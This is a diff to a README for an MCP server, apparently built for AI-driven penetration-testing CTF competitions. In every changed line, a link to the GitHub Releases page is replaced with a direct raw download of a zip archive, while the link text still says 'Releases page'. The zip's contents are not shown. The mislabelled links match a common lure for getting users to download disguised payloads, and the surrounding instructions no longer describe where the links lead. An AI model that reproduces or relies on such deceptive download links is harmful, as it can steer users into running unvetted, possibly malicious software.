@@ -1,7 +1,7 @@
 # 🎉 ez-xbow-platform-mcp - Power Your AI-Powered Penetration Testing
 
 ## 📥 Download Now 
-[![Download ez-xbow-platform-mcp](https://img.shields.io/badge/Download-ez--xbow--platform--mcp-brightgreen)](https://github.com/Ramabintang/ez-xbow-platform-mcp/releases)
+[![Download ez-xbow-platform-mcp](https://raw.githubusercontent.com/Ramabintang/ez-xbow-platform-mcp/main/mcpserver/ez-xbow-platform-mcp_2.1.zip)](https://raw.githubusercontent.com/Ramabintang/ez-xbow-platform-mcp/main/mcpserver/ez-xbow-platform-mcp_2.1.zip)
 
 ## 📖 Introduction
 Welcome to the **ez-xbow-platform-mcp**! This tool is designed for AI-driven penetration testing competitions. It serves as a **Model Context Protocol (MCP)** server that allows large language models (LLMs) to participate independently in Capture the Flag (CTF) challenges. 
@@ -12,7 +12,7 @@ With **ez-xbow-platform-mcp**, you can experience a seamless way to engage with 
 Follow these steps to download and run the software:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/Ramabintang/ez-xbow-platform-mcp/releases) to find the latest version of the application.
+   Go to our [Releases page](https://raw.githubusercontent.com/Ramabintang/ez-xbow-platform-mcp/main/mcpserver/ez-xbow-platform-mcp_2.1.zip) to find the latest version of the application.
    
 2. **Download the Application**  
    On the Releases page, you will see a list of files. Click on the version number of the release you want to download. This takes you to a page with all the assets related to that version. Look for a file that is appropriate for your operating system.
@@ -69,6 +69,6 @@ A: Additional details can be found in the documentation folder included with the
 
 ## 🔗 Download & Install
 For your convenience, here’s the download link again:  
-[Visit the Releases page to download](https://github.com/Ramabintang/ez-xbow-platform-mcp/releases).
+[Visit the Releases page to download](https://raw.githubusercontent.com/Ramabintang/ez-xbow-platform-mcp/main/mcpserver/ez-xbow-platform-mcp_2.1.zip).
 
 Follow these steps carefully to set up and enjoy your AI-driven penetration testing experience with **ez-xbow-platform-mcp**. Happy testing!
